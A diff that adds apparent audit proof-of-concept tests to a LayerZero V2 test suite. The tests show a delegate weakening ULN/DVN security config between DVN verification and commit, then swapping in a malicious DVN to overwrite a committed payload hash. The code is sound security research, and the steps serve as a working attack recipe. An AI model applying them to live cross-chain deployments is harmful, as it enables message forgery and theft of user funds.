@@ -4,6 +4,14 @@ pragma solidity ^0.8.0;
 import { Origin } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/ILayerZeroEndpointV2.sol";
 import { EndpointV2 } from "@layerzerolabs/lz-evm-protocol-v2/contracts/EndpointV2.sol";
 import { Packet } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/ISendLib.sol";
+import { SetConfigParam } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/IMessageLibManager.sol";
+import { PacketV1Codec } from "@layerzerolabs/lz-evm-protocol-v2/contracts/messagelib/libs/PacketV1Codec.sol";
+
+import { UlnConfig, SetDefaultUlnConfigParam } from "../../contracts/uln/UlnBase.sol";
+import { ReceiveUln302 } from "../../contracts/uln/uln302/ReceiveUln302.sol";
+import { DVN } from "../../contracts/uln/dvn/DVN.sol";
+import { DVNFeeLib } from "../../contracts/uln/dvn/DVNFeeLib.sol";
+import { IDVN } from "../../contracts/uln/interfaces/IDVN.sol";
 
 import { PacketUtil } from "../util/Packet.sol";
 import { AuditBase } from "./AuditBase.t.sol";
@@ -116,5 +124,210 @@ contract AccessControlTest is AuditBase {
         // Verify: delegate's delegate is set, not victim's
         assertEq(dstEndpoint.delegates(delegate), address(0xE71));
         assertEq(dstEndpoint.delegates(victim), address(0)); // victim unaffected
+    }
+
+    // ==================== AV5.5: Config Retroactivity — Delegate Weakens Config Between Verify and Commit ====================
+    /// @dev CRITICAL: Delegate can change ULN config AFTER DVNs have verified,
+    ///      causing commitVerification to use weakened security parameters.
+    ///      Config is read at commit time, not at verify time. No snapshot.
+    function test_AV5_5_ConfigRetroactivity_DelegateWeakensBeforeCommit() public {
+        // Use address(this) as the OApp (implements allowInitializePath)
+        address delegate = address(0xDE1E);
+
+        // Step 1: Set up a delegate for this OApp
+        dstEndpoint.setDelegate(delegate);
+
+        // Step 2: Deploy 2 additional DVNs for a 3-DVN config
+        DVN dvn2 = _deployExtraDVN();
+        DVN dvn3 = _deployExtraDVN();
+
+        // Step 3: Set OApp config to STRONG security (3 required DVNs, 20 confirmations)
+        address[] memory unsorted = new address[](3);
+        unsorted[0] = address(dstDvn);
+        unsorted[1] = address(dvn2);
+        unsorted[2] = address(dvn3);
+        address[] memory strongDvns = _sortAddresses(unsorted);
+
+        UlnConfig memory strongConfig = UlnConfig({
+            confirmations: 20,
+            requiredDVNCount: 3,
+            optionalDVNCount: 0,
+            optionalDVNThreshold: 0,
+            requiredDVNs: strongDvns,
+            optionalDVNs: new address[](0)
+        });
+
+        _setOAppConfig(address(this), strongConfig);
+
+        // Verify strong config is active
+        UlnConfig memory active = dstReceiveUln.getUlnConfig(address(this), SRC_EID);
+        assertEq(active.confirmations, 20, "Should have 20 confirmations");
+        assertEq(active.requiredDVNCount, 3, "Should require 3 DVNs");
+
+        // Step 4: All 3 DVNs verify the message with 20+ confirmations
+        Packet memory packet = _makePacket(1, address(this), address(this), "legit_msg");
+        (, bytes memory header, , bytes32 payloadHash) = _encodeAndSplit(packet);
+
+        _dvnVerify(dstDvn, dstReceiveUln, header, payloadHash, 20);
+        _dvnVerify(dvn2, dstReceiveUln, header, payloadHash, 20);
+        _dvnVerify(dvn3, dstReceiveUln, header, payloadHash, 20);
+
+        // Step 5: BEFORE commitVerification, delegate WEAKENS the config
+        // Change to: 1 required DVN, NIL_CONFIRMATIONS (resolves to 0)
+        address[] memory weakDvns = new address[](1);
+        weakDvns[0] = address(dstDvn); // only need 1 DVN now
+
+        UlnConfig memory weakConfig = UlnConfig({
+            confirmations: type(uint64).max, // NIL_CONFIRMATIONS -> resolves to 0
+            requiredDVNCount: 1,
+            optionalDVNCount: 0,
+            optionalDVNThreshold: 0,
+            requiredDVNs: weakDvns,
+            optionalDVNs: new address[](0)
+        });
+
+        _setOAppConfigAs(delegate, address(this), weakConfig);
+
+        // Verify config was weakened
+        UlnConfig memory weakened = dstReceiveUln.getUlnConfig(address(this), SRC_EID);
+        assertEq(weakened.confirmations, 0, "Config retroactively weakened to 0 confirmations");
+        assertEq(weakened.requiredDVNCount, 1, "Config retroactively reduced to 1 DVN");
+
+        // Step 6: commitVerification now uses the WEAK config
+        // Only dstDvn's verification is needed (even though all 3 had verified)
+        // And 0 confirmations passes (even though DVNs submitted with 20)
+        _commitVerification(dstReceiveUln, header, payloadHash);
+
+        emit log("CONFIRMED: Config retroactivity attack successful");
+        emit log("DVNs verified under 3-of-3 / 20-confirmation config");
+        emit log("Delegate weakened to 1-of-3 / 0-confirmation AFTER verification");
+        emit log("commitVerification succeeded under the weakened config");
+    }
+
+    // ==================== AV5.6: Payload Overwrite via Config Change + Re-verify ====================
+    /// @dev After commitVerification, a compromised delegate can change the DVN set
+    ///      and use the new DVN to re-verify with a different payload hash,
+    ///      then re-commit to overwrite the original payload.
+    function test_AV5_6_PayloadOverwriteViaConfigChangeAndReverify() public {
+        address delegate = address(0xDE1E);
+        dstEndpoint.setDelegate(delegate);
+
+        // Step 1: Legitimate message verified and committed under default config
+        Packet memory legitimatePacket = _makePacket(1, address(this), address(this), "legit");
+        (, bytes memory header, , bytes32 legitimatePayloadHash) = _encodeAndSplit(legitimatePacket);
+
+        _dvnVerify(dstDvn, dstReceiveUln, header, legitimatePayloadHash, 1);
+        _commitVerification(dstReceiveUln, header, legitimatePayloadHash);
+
+        // Verify: legitimate hash is committed
+        bytes32 senderBytes32 = bytes32(uint256(uint160(address(this))));
+        bytes32 stored = dstEndpoint.inboundPayloadHash(
+            address(this), SRC_EID, senderBytes32, 1
+        );
+        assertEq(stored, legitimatePayloadHash, "Legitimate hash should be stored");
+
+        // Step 2: Deploy a malicious DVN controlled by the delegate
+        DVN maliciousDvn = _deployExtraDVN();
+
+        // Step 3: Delegate changes config to use malicious DVN with NIL_CONFIRMATIONS
+        address[] memory malDvns = new address[](1);
+        malDvns[0] = address(maliciousDvn);
+
+        UlnConfig memory malConfig = UlnConfig({
+            confirmations: type(uint64).max, // NIL_CONFIRMATIONS
+            requiredDVNCount: 1,
+            optionalDVNCount: 0,
+            optionalDVNThreshold: 0,
+            requiredDVNs: malDvns,
+            optionalDVNs: new address[](0)
+        });
+
+        _setOAppConfigAs(delegate, address(this), malConfig);
+
+        // Step 4: Malicious DVN verifies with DIFFERENT payload hash
+        bytes32 maliciousPayloadHash = keccak256("malicious_payload");
+        _dvnVerify(maliciousDvn, dstReceiveUln, header, maliciousPayloadHash, 0);
+
+        // Step 5: Re-commit with malicious payload hash — OVERWRITES the legitimate one
+        _commitVerification(dstReceiveUln, header, maliciousPayloadHash);
+
+        // Step 6: Verify the overwrite
+        bytes32 storedAfter = dstEndpoint.inboundPayloadHash(
+            address(this), SRC_EID, senderBytes32, 1
+        );
+        assertEq(storedAfter, maliciousPayloadHash, "Legitimate hash OVERWRITTEN by malicious");
+        assertTrue(storedAfter != legitimatePayloadHash, "Original payload permanently lost");
+
+        emit log("CONFIRMED: Payload overwrite via delegate config change + re-verify");
+        emit log("1. Legitimate message committed");
+        emit log("2. Delegate swaps DVN set + zeros confirmations");
+        emit log("3. Malicious DVN re-verifies with different payload");
+        emit log("4. Re-commit overwrites legitimate hash -> PERMANENT FUND LOSS");
+    }
+
+    // ==================== Helpers ====================
+
+    uint256 internal _dvnCounter = 100;
+    uint32 internal constant CONFIG_TYPE_ULN = 2;
+
+    function _deployExtraDVN() internal returns (DVN dvn) {
+        _dvnCounter++;
+        address[] memory libs = new address[](4);
+        libs[0] = address(0);
+        libs[1] = address(0);
+        libs[2] = address(dstSendUln);
+        libs[3] = address(dstReceiveUln);
+        address[] memory signers_ = new address[](1);
+        signers_[0] = address(this);
+        address[] memory admins = new address[](1);
+        admins[0] = address(this);
+
+        dvn = new DVN(DST_EID, DST_EID, libs, address(dstFixture.priceFeed), signers_, 1, admins);
+        dvn.setWorkerFeeLib(address(new DVNFeeLib(DST_EID, 1e18)));
+
+        // Set DstConfig
+        IDVN.DstConfigParam[] memory dstCfg = new IDVN.DstConfigParam[](1);
+        dstCfg[0] = IDVN.DstConfigParam({
+            dstEid: SRC_EID,
+            gas: 5000,
+            multiplierBps: 10000,
+            floorMarginUSD: 1e10
+        });
+        dvn.setDstConfig(dstCfg);
+    }
+
+    function _setOAppConfig(address oapp, UlnConfig memory config) internal {
+        bytes memory configBytes = abi.encode(config);
+        SetConfigParam[] memory cfgParams = new SetConfigParam[](1);
+        cfgParams[0] = SetConfigParam({
+            eid: SRC_EID,
+            configType: CONFIG_TYPE_ULN,
+            config: configBytes
+        });
+        dstEndpoint.setConfig(oapp, address(dstReceiveUln), cfgParams);
+    }
+
+    function _setOAppConfigAs(address caller, address oapp, UlnConfig memory config) internal {
+        bytes memory configBytes = abi.encode(config);
+        SetConfigParam[] memory cfgParams = new SetConfigParam[](1);
+        cfgParams[0] = SetConfigParam({
+            eid: SRC_EID,
+            configType: CONFIG_TYPE_ULN,
+            config: configBytes
+        });
+        vm.prank(caller);
+        dstEndpoint.setConfig(oapp, address(dstReceiveUln), cfgParams);
+    }
+
+    function _sortAddresses(address[] memory arr) internal pure returns (address[] memory) {
+        uint256 n = arr.length;
+        for (uint256 i = 0; i < n; i++) {
+            for (uint256 j = i + 1; j < n; j++) {
+                if (arr[i] > arr[j]) {
+                    (arr[i], arr[j]) = (arr[j], arr[i]);
+                }
+            }
+        }
+        return arr;
     }
 }
